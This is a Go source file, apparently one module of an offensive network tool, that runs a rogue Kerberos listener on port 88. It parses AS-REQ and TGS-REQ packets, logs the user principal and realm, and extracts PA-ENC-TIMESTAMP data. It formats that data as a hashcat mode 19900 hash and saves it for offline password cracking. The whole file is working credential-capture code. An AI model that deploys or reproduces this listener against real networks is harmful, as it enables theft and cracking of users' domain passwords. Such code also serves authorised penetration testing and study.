package main

import (
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"time"
)

// Kerberos message type tags (application class)
const (
	asReqTag  = 10 // AS-REQ
	tgsReqTag = 12 // TGS-REQ
)

func serveKerberos(ifaceIP net.IP) {
	go serveKerberosTCP(ifaceIP)
	serveKerberosUDP(ifaceIP)
}

func serveKerberosUDP(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("%s:88", ifaceIP))
	if err != nil {
		logError("Kerberos UDP listen :88 — %v (need root?)", err)
		return
	}
	defer conn.Close()
	logInfo("Kerberos listening on %s:88 (UDP+TCP)", ifaceIP)

	buf := make([]byte, 4096)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go handleKerberosPacket(pkt, src)
	}
}

func serveKerberosTCP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:88", ifaceIP))
	if err != nil {
		return
	}
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			c.SetDeadline(time.Now().Add(10 * time.Second))
			// TCP Kerberos: 4-byte big-endian length prefix
			lenBuf := make([]byte, 4)
			if _, err := io.ReadFull(c, lenBuf); err != nil {
				return
			}
			pktLen := binary.BigEndian.Uint32(lenBuf)
			if pktLen > 65536 {
				return
			}
			pkt := make([]byte, pktLen)
			if _, err := io.ReadFull(c, pkt); err != nil {
				return
			}
			handleKerberosPacket(pkt, c.RemoteAddr())
		}(c)
	}
}

// handleKerberosPacket parses a Kerberos AS-REQ and logs the principal name.
// The packet is a DER-encoded KDC-REQ (SEQUENCE wrapping APPLICATION [10]).
func handleKerberosPacket(pkt []byte, src net.Addr) {
	if len(pkt) < 4 {
		return
	}

	// Strip outer SEQUENCE wrapper if present (0x30)
	data := pkt
	if data[0] == 0x30 {
		var raw asn1.RawValue
		if _, err := asn1.Unmarshal(data, &raw); err != nil {
			return
		}
		data = raw.Bytes
	}

	// Expect APPLICATION [10] = AS-REQ or [12] = TGS-REQ
	if len(data) < 2 {
		return
	}
	appTag := data[0] & 0x1F
	if appTag != asReqTag && appTag != tgsReqTag {
		logVerbose("Kerberos: unexpected tag %d from %s", appTag, src)
		return
	}

	msgType := "AS-REQ"
	if appTag == tgsReqTag {
		msgType = "TGS-REQ"
	}

	// Inner content: strip APPLICATION tag
	var appRaw asn1.RawValue
	if _, err := asn1.Unmarshal(data, &appRaw); err != nil {
		logVerbose("Kerberos: failed to parse APPLICATION tag from %s: %v", src, err)
		return
	}

	// KDC-REQ body is a SEQUENCE; parse fields
	principal, realm, paData := parseKDCReq(appRaw.Bytes)

	if principal != "" {
		logSuccess("[Kerberos] %s from %s — realm=%s principal=%s", msgType, src, realm, principal)
	} else {
		logVerbose("Kerberos: %s from %s (could not extract principal)", msgType, src)
	}

	// If there is PA-DATA with PA-ENC-TIMESTAMP (type 2), log it for offline cracking
	for _, pad := range paData {
		if pad.paType == 2 && len(pad.value) > 0 {
			// PA-ENC-TIMESTAMP can be cracked with hashcat -m 19900
			logSuccess("[Kerberos] PA-ENC-TIMESTAMP from %s\\%s (hashcat -m 19900)", realm, principal)
			logSuccess("           $krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value))
			saveHash(fmt.Sprintf("$krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value)))
		}
	}
}

type paDataEntry struct {
	paType int
	value  []byte
}

// parseKDCReq does a best-effort parse of a KDC-REQ SEQUENCE body.
// Returns cname, realm, and any PA-DATA entries found.
func parseKDCReq(body []byte) (principal, realm string, paData []paDataEntry) {
	// KDC-REQ ::= SEQUENCE {
	//   pvno       [1] INTEGER (5)
	//   msg-type   [2] INTEGER (10/12)
	//   padata     [3] SEQUENCE OF PA-DATA OPTIONAL
	//   req-body   [4] KDC-REQ-BODY
	// }
	// Each field is context-specific [N] EXPLICIT
	var seq asn1.RawValue
	rest, err := asn1.Unmarshal(body, &seq)
	if err != nil || seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence {
		// body might already be unwrapped
		rest = body
		_ = rest
	}

	// Walk the sequence manually
	data := seq.Bytes
	if len(data) == 0 {
		data = body
	}

	for len(data) > 2 {
		var field asn1.RawValue
		rest, err := asn1.Unmarshal(data, &field)
		if err != nil {
			break
		}
		data = rest

		if field.Class != asn1.ClassContextSpecific {
			continue
		}

		switch field.Tag {
		case 3: // padata [3]
			paData = parsePAData(field.Bytes)
		case 4: // req-body [4]
			principal, realm = parseReqBody(field.Bytes)
		}
	}
	return
}

func parsePAData(data []byte) []paDataEntry {
	var entries []paDataEntry
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(data, &seq); err != nil {
		return nil
	}
	seqData := seq.Bytes
	for len(seqData) > 0 {
		var item asn1.RawValue
		rest, err := asn1.Unmarshal(seqData, &item)
		if err != nil {
			break
		}
		seqData = rest
		// PA-DATA ::= SEQUENCE { padata-type [1] INTEGER, padata-value [2] OCTET STRING }
		entry := paDataEntry{}
		itemData := item.Bytes
		for len(itemData) > 0 {
			var f asn1.RawValue
			r, err := asn1.Unmarshal(itemData, &f)
			if err != nil {
				break
			}
			itemData = r
			if f.Class == asn1.ClassContextSpecific {
				switch f.Tag {
				case 1: // padata-type
					var n int
					asn1.Unmarshal(f.Bytes, &n)
					entry.paType = n
				case 2: // padata-value
					var b []byte
					asn1.Unmarshal(f.Bytes, &b)
					entry.value = b
				}
			}
		}
		if entry.paType != 0 {
			entries = append(entries, entry)
		}
	}
	return entries
}

func parseReqBody(data []byte) (principal, realm string) {
	// KDC-REQ-BODY ::= SEQUENCE {
	//   ...
	//   realm    [7] Realm
	//   cname    [8] PrincipalName OPTIONAL (AS-REQ only)
	//   ...
	// }
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(data, &seq); err != nil {
		return
	}
	body := seq.Bytes
	for len(body) > 0 {
		var f asn1.RawValue
		rest, err := asn1.Unmarshal(body, &f)
		if err != nil {
			break
		}
		body = rest
		if f.Class != asn1.ClassContextSpecific {
			continue
		}
		switch f.Tag {
		case 7: // realm
			var s string
			asn1.Unmarshal(f.Bytes, &s)
			realm = s
		case 8: // cname (in AS-REQ)
			principal = parsePrincipalName(f.Bytes)
		}
	}
	return
}

func parsePrincipalName(data []byte) string {
	// PrincipalName ::= SEQUENCE { name-type [0] INTEGER, name-string [1] SEQUENCE OF KerberosString }
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(data, &seq); err != nil {
		return ""
	}
	seqData := seq.Bytes
	for len(seqData) > 0 {
		var f asn1.RawValue
		rest, err := asn1.Unmarshal(seqData, &f)
		if err != nil {
			break
		}
		seqData = rest
		if f.Class == asn1.ClassContextSpecific && f.Tag == 1 {
			// SEQUENCE OF KerberosString
			var names asn1.RawValue
			if _, err := asn1.Unmarshal(f.Bytes, &names); err != nil {
				break
			}
			nameData := names.Bytes
			var parts []string
			for len(nameData) > 0 {
				var s string
				rest, err := asn1.Unmarshal(nameData, &s)
				if err != nil {
					break
				}
				nameData = rest
				parts = append(parts, s)
			}
			if len(parts) > 0 {
				result := parts[0]
				for i := 1; i < len(parts); i++ {
					result += "/" + parts[i]
				}
				return result
			}
		}
	}
	return ""
}
